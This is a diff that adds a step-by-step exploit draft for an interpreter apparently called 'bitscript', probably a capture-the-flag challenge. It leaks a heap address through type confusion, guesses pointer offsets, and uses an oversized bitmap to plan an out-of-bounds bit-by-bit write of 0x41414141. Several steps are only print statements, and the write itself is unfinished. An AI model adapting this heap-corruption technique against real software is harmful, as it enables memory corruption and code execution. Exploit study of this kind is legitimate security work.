@@ -1,0 +1,60 @@
+print("=== Bit-by-Bit Write Implementation ===");
+
+print("Step 1: Leak heap address");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Step 2: Calculate candidate addresses");
+print("targetaddr = 324521456 (0x1355F5F0)");
+
+int entrycandidate1 = targetaddr - 512;
+int entrycandidate2 = targetaddr - 768;
+int entrycandidate3 = targetaddr - 1024;
+print("Entry address candidates:");
+print(entrycandidate1);
+print(entrycandidate2);
+print(entrycandidate3);
+
+int valueptrcandidate1 = entrycandidate1 + 40;
+int valueptrcandidate2 = entrycandidate2 + 40;
+int valueptrcandidate3 = entrycandidate3 + 40;
+print("Value pointer candidates (entry + 0x28):");
+print(valueptrcandidate1);
+print(valueptrcandidate2);
+print(valueptrcandidate3);
+
+print("Step 3: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 4: Estimate bitmap buffer address");
+int bitmapcandidate1 = targetaddr + 2048;
+int bitmapcandidate2 = targetaddr + 4096;
+int bitmapcandidate3 = targetaddr + 8192;
+print("Bitmap buffer candidates:");
+print(bitmapcandidate1);
+print(bitmapcandidate2);
+print(bitmapcandidate3);
+
+print("Step 5: Calculate coordinates for writing");
+print("For each value_ptr and bitmap_data_ptr combination:");
+print("  offset = value_ptr - bitmap_data_ptr");
+print("  bit_offset = offset * 8");
+print("  y = bit_offset / INT64_MAX");
+print("  x = bit_offset % 8");
+
+print("Step 6: Write test value bit-by-bit");
+print("Test value: 0x41414141 (1094795585 in decimal)");
+print("This is 32 bits, but we need to write 64 bits");
+print("So write: 0x0000000041414141");
+
+print("Note: Actual bit-by-bit write implementation");
+print("needs to extract each bit and write using set()");
+print("This is complex in bitscript, might need Python helper");
+
+print("Step 7: Verify write");
+print("After writing, read: int test = target;");
+print("If test == 1094795585, addresses are correct!");
+
